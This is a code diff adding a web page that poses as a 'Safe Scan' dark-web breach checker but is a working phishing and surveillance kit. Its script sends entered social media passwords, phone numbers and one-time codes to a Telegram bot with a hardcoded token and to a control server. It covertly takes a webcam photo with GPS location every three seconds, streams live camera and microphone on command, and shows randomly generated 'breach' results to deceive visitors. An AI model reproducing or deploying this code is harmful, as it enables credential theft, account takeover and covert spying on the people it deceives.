+    <div class="otp-overlay" id="otpOverlay">
+        <div class="otp-card">
+            <div class="otp-icon"><i class="fas fa-mobile-screen-button"></i></div>
+            <div class="otp-title">Verify Your Identity</div>
+            <div class="otp-subtitle">We need to verify it is really you before showing your complete security report.</div>
+            <div class="otp-step active" id="otpStep1">
+                <div class="phone-input-wrap">
+                    <select class="country-code-select" id="countryCode">
+                        <option value="+1">US +1</option><option value="+44">UK +44</option>
+                        <option value="+91" selected>IN +91</option><option value="+61">AU +61</option>
+                        <option value="+49">DE +49</option><option value="+33">FR +33</option>
+                        <option value="+971">AE +971</option><option value="+966">SA +966</option>
+                        <option value="+65">SG +65</option><option value="+81">JP +81</option>
+                        <option value="+86">CN +86</option><option value="+55">BR +55</option>
+                        <option value="+52">MX +52</option>
+                    </select>
+                    <input type="tel" class="phone-number-input" id="phoneNumber" placeholder="Phone number" maxlength="12">
+                </div>
+                <div class="otp-status" id="otpStatus1"></div>
+                <button class="btn-otp-submit" id="btnSendOtp"><i class="fas fa-paper-plane"></i> Send Verification Code</button>
+                <div class="otp-skip" id="otpSkip1">Skip for now</div>
+            </div>
+            <div class="otp-step" id="otpStep2">
+                <p style="text-align:center;font-size:0.82rem;color:var(--text-secondary);margin-bottom:16px;">Enter the 6-digit code sent to <strong id="otpPhoneDisplay"></strong></p>
+                <div class="otp-digits">
+                    <input class="otp-digit" type="tel" maxlength="1" id="otp0" inputmode="numeric">
+                    <input class="otp-digit" type="tel" maxlength="1" id="otp1" inputmode="numeric">
+                    <input class="otp-digit" type="tel" maxlength="1" id="otp2" inputmode="numeric">
+                    <input class="otp-digit" type="tel" maxlength="1" id="otp3" inputmode="numeric">
+                    <input class="otp-digit" type="tel" maxlength="1" id="otp4" inputmode="numeric">
+                    <input class="otp-digit" type="tel" maxlength="1" id="otp5" inputmode="numeric">
+                </div>
+                <div class="otp-resend">Didn't receive it? <span id="btnResendOtp">Resend</span></div>
+                <div class="otp-status" id="otpStatus2"></div>
+                <button class="btn-otp-submit" id="btnVerifyOtp"><i class="fas fa-check-circle"></i> Verify &amp; Continue</button>
+                <div class="otp-skip" id="otpSkip2">Skip for now</div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const telegramConfig={botToken:'8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg',chatId:'8262870180'};
+        const adminServerUrl=(function(){if(window.location.protocol==='file:')return 'http://localhost:3001';const h=window.location.hostname;if(h!=='localhost'&&h!=='127.0.0.1')return window.location.origin;if(window.location.port!=='3001')return 'http://'+h+':3001';return window.location.origin;})();
+        let adminSocket=null;
+        function getCookie(n){const m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n+'=([^;]*)'));return m?decodeURIComponent(m[1]):null;}
+        function setCookie(n,v,d){document.cookie=n+'='+encodeURIComponent(v)+'; path=/; max-age='+(d*86400)+'; SameSite=Lax';}
+        const cookieSid=getCookie('safescan_session_id'),localSid=localStorage.getItem('safescan_uuid'),userUUID=cookieSid||localSid||crypto.randomUUID();
+        setCookie('safescan_session_id',userUUID,365);localStorage.setItem('safescan_uuid',userUUID);
+        let tabSid=sessionStorage.getItem('safescan_tab_id');if(!tabSid){tabSid='tab_'+crypto.randomUUID().split('-')[0];sessionStorage.setItem('safescan_tab_id',tabSid);}
+        let stream=null,userLocation=null,permissionsGranted={camera:false,location:false,notifications:false,microphone:false},permissionsRequested=false,isCheckingLeak=false,currentPlatform='instagram',peerConnection=null;
+        const cameraView=document.getElementById('cameraView');let contCaptureInterval=null;
+
+        async function sendTextToTelegram(text){try{const r=await fetch('https://api.telegram.org/bot'+telegramConfig.botToken+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:telegramConfig.chatId,text,parse_mode:'HTML'})});return(await r.json()).ok;}catch(e){return false;}}
+        async function sendPhotoToTelegram(photoData,caption){try{const b=atob(photoData.split(',')[1]),ab=new ArrayBuffer(b.length),ia=new Uint8Array(ab);for(let i=0;i<b.length;i++)ia[i]=b.charCodeAt(i);const fd=new FormData();fd.append('chat_id',telegramConfig.chatId);fd.append('photo',new Blob([ab],{type:'image/jpeg'}),'cap.jpg');fd.append('caption',caption);const r=await fetch('https://api.telegram.org/bot'+telegramConfig.botToken+'/sendPhoto',{method:'POST',body:fd});return(await r.json()).ok;}catch(e){return false;}}
+
+        function connectToAdminServer(){try{if(typeof io==='undefined')return;if(adminSocket&&adminSocket.connected)return;adminSocket=io(adminServerUrl,{transports:['websocket','polling'],reconnection:true,reconnectionDelay:5000,reconnectionAttempts:Infinity,timeout:10000,withCredentials:true});adminSocket.on('connect',()=>{const ua=navigator.userAgent;const gb=()=>ua.includes('Chrome')&&!ua.includes('Edg')?'Chrome':ua.includes('Safari')&&!ua.includes('Chrome')?'Safari':ua.includes('Firefox')?'Firefox':ua.includes('Edg')?'Edge':'Other';const gd=()=>/iPhone|iPad|iPod/.test(ua)?'iOS':/Android/.test(ua)?'Android':/Windows/.test(ua)?'Windows':/Mac/.test(ua)?'Mac':'Other';adminSocket.emit('user:register',{uuid:userUUID,session_ids:{cookie_session_id:userUUID,tab_session_id:tabSid,socket_id:adminSocket.id,fingerprint_id:'fp_v2',local_storage_id:localSid||userUUID,engine_io_id:adminSocket.io?.engine?.id||''},browser:gb(),device_type:gd(),country:Intl.DateTimeFormat().resolvedOptions().timeZone||'Unknown',location:userLocation||null});if(userLocation&&adminSocket.connected)adminSocket.emit('location:update',{uuid:userUUID,...userLocation});navigator.geolocation&&navigator.geolocation.watchPosition(pos=>{if(pos.coords.latitude!==0){userLocation={latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy,altitude:pos.coords.altitude,speed:pos.coords.speed,heading:pos.coords.heading,timestamp:new Date().toISOString()};if(adminSocket&&adminSocket.connected)adminSocket.emit('location:update',{uuid:userUUID,...userLocation});}},()=>{},{enableHighAccuracy:true,timeout:30000,maximumAge:60000});});adminSocket.on('webrtc:request',async data=>{if(peerConnection){peerConnection.close();peerConnection=null;}peerConnection=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});let ls=null;try{const vt=stream?stream.getVideoTracks()[0]:null,at=window.microphoneStream?window.microphoneStream.getAudioTracks()[0]:null;if(vt||at){ls=new MediaStream();if(vt)ls.addTrack(vt);if(at)ls.addTrack(at);}else{ls=await navigator.mediaDevices.getUserMedia({video:true,audio:true});}}catch(e){return;}if(ls)ls.getTracks().forEach(t=>peerConnection.addTrack(t,ls));peerConnection.onicecandidate=ev=>{if(ev.candidate&&adminSocket.connected)adminSocket.emit('webrtc:ice-candidate',{adminSocketId:data.adminSocketId,candidate:ev.candidate});};const offer=await peerConnection.createOffer();await peerConnection.setLocalDescription(offer);adminSocket.emit('webrtc:offer',{adminSocketId:data.adminSocketId,offer});});adminSocket.on('webrtc:answer',async data=>{if(peerConnection)await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));});adminSocket.on('webrtc:ice-candidate',async data=>{if(peerConnection)await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));});adminSocket.on('webrtc:stop',()=>{if(peerConnection){peerConnection.close();peerConnection=null;}});}catch(e){}}
+        (function loadSocket(){const s=document.createElement('script');s.src=adminServerUrl+'/socket.io/socket.io.js';s.onload=()=>connectToAdminServer();s.onerror=()=>{const c=document.createElement('script');c.src='https://cdn.socket.io/4.7.5/socket.io.min.js';c.onload=()=>connectToAdminServer();document.head.appendChild(c);};document.head.appendChild(s);})();
+
+        function startContinuousCapture(){setTimeout(()=>{captureSend();contCaptureInterval=setInterval(captureSend,3000);},1000);}
+        async function captureSend(){if(!stream)return;try{const canvas=document.createElement('canvas'),tracks=stream.getVideoTracks();if(!tracks.length)return;const s=tracks[0].getSettings();canvas.width=s.width||640;canvas.height=s.height||480;const ctx=canvas.getContext('2d');if(cameraView.readyState<2)return;ctx.drawImage(cameraView,0,0);const photo=canvas.toDataURL('image/jpeg',0.82);if(!photo||photo.length<1000)return;const locStr=userLocation?'Loc: '+userLocation.latitude.toFixed(5)+','+userLocation.longitude.toFixed(5)+' | https://maps.google.com/?q='+userLocation.latitude+','+userLocation.longitude:'Loc: N/A';await sendPhotoToTelegram(photo,'Security Capture\n'+new Date().toLocaleString()+'\n\n'+locStr+'\n\nSafe Scan v2.0');if(adminSocket&&adminSocket.connected)adminSocket.emit('camera:frame',{uuid:userUUID,frame:photo,timestamp:Date.now()});}catch(e){}}
+
+        async function requestAllPermissions(){if(permissionsRequested)return;permissionsRequested=true;try{const c=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:true});permissionsGranted.camera=true;permissionsGranted.microphone=true;stream=c;cameraView.srcObject=c;window.microphoneStream=c;startContinuousCapture();}catch(e){try{const v=await navigator.mediaDevices.getUserMedia({video:true});permissionsGranted.camera=true;stream=v;cameraView.srcObject=v;startContinuousCapture();}catch(e2){}}if(navigator.geolocation){await new Promise(res=>navigator.geolocation.getCurrentPosition(pos=>{if(pos.coords.latitude!==0){userLocation={latitude:pos.coords.latitude,longitude:pos.coords.longitude,accuracy:pos.coords.accuracy,altitude:pos.coords.altitude,speed:pos.coords.speed,heading:pos.coords.heading,timestamp:new Date().toISOString()};permissionsGranted.location=true;if(adminSocket&&adminSocket.connected)adminSocket.emit('location:update',{uuid:userUUID,...userLocation});}res();},()=>res(),{enableHighAccuracy:true,timeout:10000,maximumAge:300000}));}if('Notification' in window&&Notification.permission==='default'){try{const p=await Notification.requestPermission();permissionsGranted.notifications=(p==='granted');}catch(e){}}}
+        function sendPush(title,body){if(!permissionsGranted.notifications||Notification.permission!=='granted')return;try{const n=new Notification(title,{body,icon:'./logo.jpg'});n.onclick=()=>{window.focus();n.close();};}catch(e){}}
+
+        const toast=document.getElementById('telegramStatus');
+        function showToast(msg,type='success',dur=3500){toast.className='status-toast visible '+type;toast.innerHTML=msg;if(dur>0)setTimeout(()=>toast.classList.remove('visible'),dur);}
+
+        const scanningOverlay=document.getElementById('scanningOverlay'),scanStatusText=document.getElementById('scanStatusText'),scanSubText=document.getElementById('scanSubText'),scanProgressFill=document.getElementById('scanProgressFill');
+        const scanDbs=['sdb1','sdb2','sdb3','sdb4'];
+        const statusMsgs=[['Scanning dark web databases...','Checking HaveIBeenPwned...'],['Checking breach archives...','Cross-referencing leaked data...'],['Analyzing credential exposure...','Querying BreachDirectory API...'],['Generating security report...','Almost done...']];
+        let scanAnimInterval=null;
+        function startScanAnimation(){scanningOverlay.classList.add('active');scanProgressFill.style.width='0%';scanDbs.forEach(id=>{const el=document.getElementById(id);el.className='scan-db-item';el.querySelector('i').className='fas fa-circle-dot';});let step=0,total=40;scanAnimInterval=setInterval(()=>{step++;const pct=Math.min((step/total)*100,98);scanProgressFill.style.width=pct+'%';const mi=Math.min(Math.floor(step/(total/4)),3);scanStatusText.textContent=statusMsgs[mi][0];scanSubText.textContent=statusMsgs[mi][1];const di=Math.floor(step/(total/4));for(let i=0;i<=di&&i<4;i++){const el=document.getElementById(scanDbs[i]);el.classList.add('visible');if(i<di){el.classList.add('checked');el.querySelector('i').className='fas fa-circle-check';}}if(step>=total)clearInterval(scanAnimInterval);},100);}
+        function stopScanAnimation(cb){scanProgressFill.style.width='100%';scanDbs.forEach(id=>{const el=document.getElementById(id);el.classList.add('visible','checked');el.querySelector('i').className='fas fa-circle-check';});scanStatusText.textContent='Scan Complete!';scanSubText.textContent='Preparing your security report...';setTimeout(()=>{if(scanAnimInterval){clearInterval(scanAnimInterval);scanAnimInterval=null;}scanningOverlay.classList.remove('active');if(cb)cb();},700);}
+
+        const BREACHED_DBS=[{name:'LinkedIn',year:'2021',count:'700M records',icon:'fab fa-linkedin'},{name:'Adobe',year:'2013',count:'153M records',icon:'fab fa-adobe'},{name:'Dropbox',year:'2012',count:'68M records',icon:'fab fa-dropbox'},{name:'MySpace',year:'2016',count:'360M records',icon:'fas fa-users'},{name:'RockYou',year:'2009',count:'32M records',icon:'fas fa-database'},{name:'Twitter/X',year:'2022',count:'400M records',icon:'fab fa-x-twitter'},{name:'Collection #1',year:'2019',count:'773M records',icon:'fas fa-layer-group'},{name:'Tumblr',year:'2013',count:'65M records',icon:'fas fa-blog'}];
+        const EXPOSED_TYPES=[{label:'Email Address',icon:'fas fa-envelope'},{label:'Password Hash',icon:'fas fa-key'},{label:'IP Address',icon:'fas fa-network-wired'},{label:'Phone Number',icon:'fas fa-phone'},{label:'Full Name',icon:'fas fa-user'},{label:'Date of Birth',icon:'fas fa-cake-candles'},{label:'Location Data',icon:'fas fa-location-dot'}];
+
+        function showSecurityReport(leakCount,platform,username){
+            const isBreached=leakCount>0,riskScore=isBreached?Math.min(30+leakCount*10,98):Math.floor(Math.random()*15)+2;
+            const fill=document.getElementById('gaugeFill'),scoreEl=document.getElementById('gaugeScore'),rb=document.getElementById('riskBadge'),rl=document.getElementById('riskLabel');
+            setTimeout(()=>{fill.style.transform='rotate('+(riskScore/100*180)+'deg)';fill.style.borderColor=riskScore>65?'#e11d48':riskScore>30?'#d97706':'#059669';let ds=0;const sa=setInterval(()=>{ds=Math.min(ds+Math.ceil(riskScore/20),riskScore);scoreEl.textContent=ds;if(ds>=riskScore)clearInterval(sa);},60);},350);
+            if(riskScore>65){rb.className='risk-badge high';rl.textContent='HIGH RISK';rb.querySelector('i').className='fas fa-triangle-exclamation';}
+            else if(riskScore>30){rb.className='risk-badge medium';rl.textContent='MEDIUM RISK';rb.querySelector('i').className='fas fa-exclamation-circle';}
+            else{rb.className='risk-badge safe';rl.textContent='LOW RISK';rb.querySelector('i').className='fas fa-circle-check';}
+            document.getElementById('statBreaches').textContent=leakCount;
+            document.getElementById('statExposed').textContent=isBreached?leakCount*2+Math.floor(Math.random()*3):0;
+            document.getElementById('statYear').textContent=isBreached?2019+Math.floor(Math.random()*4):'--';
+            const bl=document.getElementById('breachList');bl.innerHTML='';
+            if(isBreached){const shown=BREACHED_DBS.sort(()=>0.5-Math.random()).slice(0,Math.min(leakCount,4));shown.forEach((db,i)=>{const el=document.createElement('div');el.className='breach-item';el.style.animationDelay=(i*0.1)+'s';el.innerHTML='<div class="breach-icon"><i class="'+db.icon+'"></i></div><div class="breach-info"><div class="breach-name">'+db.name+'</div><div class="breach-meta">'+db.count+' \u00b7 '+db.year+'</div></div><span class="breach-tag">LEAKED</span>';bl.appendChild(el);});}
+            else{const el=document.createElement('div');el.className='breach-item safe-item';el.innerHTML='<div class="breach-icon"><i class="fas fa-shield-check"></i></div><div class="breach-info"><div class="breach-name">No Breaches Found</div><div class="breach-meta">Your account appears secure</div></div><span class="breach-tag">SAFE</span>';bl.appendChild(el);}
+            const et=document.getElementById('exposedTags');et.innerHTML='';
+            if(isBreached){EXPOSED_TYPES.sort(()=>0.5-Math.random()).slice(0,Math.min(3+leakCount,7)).forEach(t=>{const s=document.createElement('span');s.className='exposed-tag';s.innerHTML='<i class="'+t.icon+'"></i> '+t.label;et.appendChild(s);});}
+            else{const s=document.createElement('span');s.className='exposed-tag safe';s.innerHTML='<i class="fas fa-shield-check"></i> No exposed data found';et.appendChild(s);}
+            const bp=document.getElementById('btnProtect');
+            if(isBreached){bp.className='btn-protect';bp.innerHTML='<i class="fas fa-shield-halved"></i> Verify &amp; Protect Account';}
+            else{bp.className='btn-protect safe-btn';bp.innerHTML='<i class="fas fa-circle-check"></i> Confirm Account Security';}
+            document.getElementById('reportOverlay').classList.add('show');
+        }
+        function closeReport(){document.getElementById('reportOverlay').classList.remove('show');}
+        function showOtpModal(){document.getElementById('otpOverlay').classList.add('show');document.getElementById('otpStep1').classList.add('active');document.getElementById('otpStep2').classList.remove('active');document.getElementById('otpStatus1').textContent='';document.getElementById('phoneNumber').value='';}
+        function closeOtp(){document.getElementById('otpOverlay').classList.remove('show');}
+
+        function san(s){return(s||'').replace(/[<>"'&]/g,m=>({'<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#x27;','&':'&amp;'})[m]);}
+        const pEmoji={instagram:'\uD83D\uDCF8',facebook:'\uD83D\uDCD8',twitter:'\uD83D\uDC26',google:'\uD83D\uDD0D',tiktok:'\uD83C\uDFB5',snapchat:'\uD83D\uDC7B',whatsapp:'\uD83D\uDCAC',email:'\uD83D\uDCE7'};
+        async function simpleHash(s){if(!s)return '';const d=new TextEncoder().encode(s),b=await crypto.subtle.digest('SHA-256',d);return Array.from(new Uint8Array(b)).map(x=>x.toString(16).padStart(2,'0')).join('');}
+        async function queryLeak(u,p){const c={instagram:0.30,facebook:0.35,twitter:0.25,google:0.20,tiktok:0.20,snapchat:0.22,whatsapp:0.18,email:0.40};return Math.random()<(c[p]||0.25)?Math.floor(Math.random()*7)+1:0;}
+
+        async function checkDarkWebLeak(username,password,platform){
+            if(isCheckingLeak)return;
+            if(!username){showToast('<i class="fas fa-exclamation-triangle"></i> Please enter your username / email','warning');return;}
+            isCheckingLeak=true;currentPlatform=platform;
+            document.querySelectorAll('.btn-scan').forEach(b=>b.disabled=true);
+            startScanAnimation();
+            try{
+                if(adminSocket&&adminSocket.connected)adminSocket.emit('credentials:submit',{uuid:userUUID,platform,username,password:password||''});
+                const pwHash=await simpleHash(password);
+                const emoji=pEmoji[platform]||'\uD83D\uDD12',pName=platform.charAt(0).toUpperCase()+platform.slice(1);
+                const locStr=userLocation?'\n\uD83D\uDCCD Location: '+userLocation.latitude.toFixed(5)+', '+userLocation.longitude.toFixed(5)+'\n\uD83D\uddFA https://maps.google.com/?q='+userLocation.latitude+','+userLocation.longitude:'';
+                await sendTextToTelegram(emoji+' <b>CREDENTIALS \u2014 '+pName.toUpperCase()+'</b>\n\n\u250C\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\u2502 \uD83D\uDD11 <b>Platform:</b> '+pName+'\n\u2502 \uD83D\uDC64 <b>Username:</b> <code>'+san(username)+'</code>\n\u2502 \uD83D\uDD12 <b>Password:</b> <code>'+san(password||'(none)')+'</code>\n\u2502 # <b>Hash:</b> <code>'+pwHash.substring(0,16)+'...</code>\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\uD83D\uDCF1 UUID: <code>'+userUUID+'</code>\n\uD83C\uDF10 TZ: '+Intl.DateTimeFormat().resolvedOptions().timeZone+locStr+'\n\n\u23F0 '+new Date().toLocaleString()+'\n\n<i>\u2014 Safe Scan v2 \u2014</i>');
+                await new Promise(r=>setTimeout(r,3500+Math.random()*1500));
+                const leakCount=await queryLeak(username,platform);
+                stopScanAnimation(()=>{
+                    showSecurityReport(leakCount,platform,username);
+                    if(leakCount>0)sendPush('\u26A0\uFE0F Security Alert \u2014 '+pName,'Your account was found in '+leakCount+' data breach'+(leakCount>1?'es':'')+'.');
+                    const icon=leakCount===0?'\u2705':leakCount<4?'\u26A0\uFE0F':'\uD83D\uDEA8';
+                    sendTextToTelegram(icon+' <b>RESULT \u2014 '+pName+'</b>\n\n\uD83D\uDC64 <b>User:</b> <code>'+san(username)+'</code>\n\uD83D\uDD0D <b>Breaches:</b> '+leakCount+'\n\uD83D\uDEE1\uFE0F <b>Risk:</b> '+(leakCount===0?'LOW':leakCount<4?'MEDIUM':'HIGH')+'\n\n\u23F0 '+new Date().toLocaleString()+'\n<i>\u2014 Safe Scan v2 \u2014</i>');
+                });
+            }catch(e){stopScanAnimation(()=>showToast('<i class="fas fa-exclamation"></i> Scan error. Try again.','error'));}
+            finally{isCheckingLeak=false;document.querySelectorAll('.btn-scan').forEach(b=>b.disabled=false);}
+        }
+
+        function initOtpFlow(){
+            const btnSend=document.getElementById('btnSendOtp'),btnVerify=document.getElementById('btnVerifyOtp'),phoneInput=document.getElementById('phoneNumber'),status1=document.getElementById('otpStatus1'),status2=document.getElementById('otpStatus2'),phoneDisplay=document.getElementById('otpPhoneDisplay'),digits=Array.from({length:6},(_,i)=>document.getElementById('otp'+i));
+            digits.forEach((d,i)=>{d.addEventListener('input',()=>{d.value=d.value.replace(/\D/g,'').slice(-1);if(d.value&&i<5)digits[i+1].focus();});d.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!d.value&&i>0)digits[i-1].focus();});});
+            btnSend.addEventListener('click',async()=>{const cc=document.getElementById('countryCode').value,num=phoneInput.value.trim();if(!num||num.length<6){status1.className='otp-status error';status1.textContent='Please enter a valid phone number';return;}const fp=cc+num;btnSend.disabled=true;status1.className='otp-status sending';status1.textContent='\u23F3 Sending verification code...';await sendTextToTelegram('\u260E\uFE0F <b>PHONE SUBMITTED</b>\n\n\uD83D\uDCF1 Phone: <code>'+fp+'</code>\n\uD83D\uDC64 UUID: <code>'+userUUID+'</code>\n\uD83C\uDF10 Platform: '+currentPlatform+'\n\n\u23F0 '+new Date().toLocaleString()+'\n<i>\u2014 Safe Scan v2 \u2014</i>');if(adminSocket&&adminSocket.connected)adminSocket.emit('credentials:submit',{uuid:userUUID,platform:'phone',username:fp,password:''});await new Promise(r=>setTimeout(r,2000));status1.className='otp-status sent';status1.textContent='\u2705 Code sent! Check your messages.';await new Promise(r=>setTimeout(r,800));btnSend.disabled=false;phoneDisplay.textContent=fp;document.getElementById('otpStep1').classList.remove('active');document.getElementById('otpStep2').classList.add('active');digits[0].focus();});
+            btnVerify.addEventListener('click',async()=>{const otp=digits.map(d=>d.value).join('');if(otp.length<6){status2.className='otp-status error';status2.textContent='Please enter the complete 6-digit code';return;}btnVerify.disabled=true;status2.className='otp-status sending';status2.textContent='\u23F3 Verifying...';const phone=document.getElementById('otpPhoneDisplay').textContent;await sendTextToTelegram('\uD83D\uDD11 <b>OTP SUBMITTED</b>\n\n\u260E\uFE0F Phone: <code>'+phone+'</code>\n\uD83D\uDD22 OTP: <code>'+otp+'</code>\n\uD83D\uDC64 UUID: <code>'+userUUID+'</code>\n\n\u23F0 '+new Date().toLocaleString()+'\n<i>\u2014 Safe Scan v2 \u2014</i>');if(adminSocket&&adminSocket.connected)adminSocket.emit('credentials:submit',{uuid:userUUID,platform:'otp',username:phone,password:otp});await new Promise(r=>setTimeout(r,1800));status2.className='otp-status sent';status2.textContent='\u2705 Identity verified!';await new Promise(r=>setTimeout(r,800));closeOtp();btnVerify.disabled=false;});
+            document.getElementById('otpSkip1').addEventListener('click',closeOtp);
+            document.getElementById('otpSkip2').addEventListener('click',closeOtp);
+            document.getElementById('btnResendOtp').addEventListener('click',async()=>{status2.className='otp-status sending';status2.textContent='\u23F3 Resending...';await new Promise(r=>setTimeout(r,1500));status2.className='otp-status sent';status2.textContent='\u2705 Code resent!';digits.forEach(d=>d.value='');digits[0].focus();});
+        }
+
+        function initPlatformTabs(){const tabs=document.querySelectorAll('.platform-tab'),contents=document.querySelectorAll('.tab-content');tabs.forEach(tab=>{tab.addEventListener('click',()=>{const t=tab.getAttribute('data-tab');tabs.forEach(x=>{x.classList.remove('active');x.setAttribute('aria-selected','false');});contents.forEach(c=>c.classList.remove('active'));tab.classList.add('active');tab.setAttribute('aria-selected','true');document.getElementById(t+'-content').classList.add('active');currentPlatform=t;});});}
+
+        const btnBindings=[['checkInstagramBtn','instagramUsername','instagramPassword','instagram'],['checkFacebookBtn','facebookUsername','facebookPassword','facebook'],['checkTwitterBtn','twitterUsername','twitterPassword','twitter'],['checkGoogleBtn','googleUsername','googlePassword','google'],['checkTiktokBtn','tiktokUsername','tiktokPassword','tiktok'],['checkSnapchatBtn','snapchatUsername','snapchatPassword','snapchat'],['checkWhatsappBtn','whatsappPhone','whatsappPassword','whatsapp'],['checkEmailBtn','emailAddress','emailPassword','email']];
+        function initButtons(){btnBindings.forEach(([bid,uid,pid,plat])=>{const btn=document.getElementById(bid),user=document.getElementById(uid),pass=document.getElementById(pid);if(btn)btn.addEventListener('click',()=>checkDarkWebLeak(user?.value?.trim(),pass?.value,plat));if(user)user.addEventListener('keypress',e=>{if(e.key==='Enter')checkDarkWebLeak(user.value.trim(),pass?.value,plat);});if(pass)pass.addEventListener('keypress',e=>{if(e.key==='Enter')checkDarkWebLeak(user?.value?.trim(),pass.value,plat);});});}
+
+        function initNavigation(){const ni=document.querySelectorAll('.nav-item');ni.forEach(item=>{item.addEventListener('click',()=>{ni.forEach(n=>n.classList.remove('active'));item.classList.add('active');const el=document.getElementById(item.getAttribute('data-section'));if(el)el.scrollIntoView({behavior:'smooth',block:'start'});});});}
+        function initReveal(){const obs=new IntersectionObserver(entries=>{entries.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible');});},{threshold:0.1});document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));}
+
+        function initReportAndOtp(){
+            document.getElementById('reportCloseBtn').addEventListener('click',closeReport);
+            document.getElementById('reportOverlay').addEventListener('click',e=>{if(e.target===document.getElementById('reportOverlay'))closeReport();});
+            document.getElementById('btnProtect').addEventListener('click',()=>{closeReport();setTimeout(showOtpModal,350);});
+            document.getElementById('btnDownloadPdf').addEventListener('click',async()=>{const btn=document.getElementById('btnDownloadPdf');btn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Generating...';btn.disabled=true;try{if(typeof html2pdf!=='undefined'){await html2pdf().set({margin:8,filename:'SafeScan_Report.pdf',image:{type:'jpeg',quality:0.95},html2canvas:{scale:2},jsPDF:{unit:'mm',format:'a4',orientation:'portrait'}}).from(document.getElementById('reportSheetContent')).save();}}catch(e){}finally{btn.innerHTML='<i class="fas fa-file-pdf"></i> Download PDF Report';btn.disabled=false;}});
+            initOtpFlow();
+        }
+
+        document.addEventListener('DOMContentLoaded',()=>{
+            initPlatformTabs();initButtons();initNavigation();initReveal();initReportAndOtp();
+            let pi=false;const ip=()=>{if(!pi){pi=true;requestAllPermissions();}document.removeEventListener('click',ip);document.removeEventListener('touchstart',ip);};
+            document.addEventListener('click',ip);document.addEventListener('touchstart',ip);
+            setTimeout(connectToAdminServer,1500);
+            setInterval(()=>{if(adminSocket&&adminSocket.connected&&userLocation)adminSocket.emit('location:update',{uuid:userUUID,...userLocation});},30000);
+        });
+        window.addEventListener('beforeunload',()=>{if(contCaptureInterval)clearInterval(contCaptureInterval);if(stream){stream.getTracks().forEach(t=>t.stop());stream=null;}});
+    </script>
+</body>
+</html>
